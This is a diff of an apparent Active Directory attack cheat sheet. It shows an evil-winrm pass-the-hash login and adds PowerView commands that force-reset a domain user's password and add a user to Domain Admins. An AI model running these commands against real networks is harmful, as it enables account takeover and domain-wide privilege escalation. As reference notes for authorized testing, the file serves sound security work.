@@ -114,9 +114,9 @@ evil-winrm -i $TARGET_IP -u $USER -H $TARGET_HASH
 ```
 ---
 ```powershell
-net user $USER /domain
-#us
-Set-DomainUserPassword -Identity $USERNAME -AccountPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -Force)
+#using PowerView.ps1
+Set-DomainUserPassword -Identity $USERNAME -AccountPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -Force) -Domain $DOMAIN
+Add-NetGroupUser -UserName $USER -GroupName "Domain Admins" -Domain $DOMAIN
 ```
 
 Pre-compiled Windows binaries (Rubeus, Certify …):
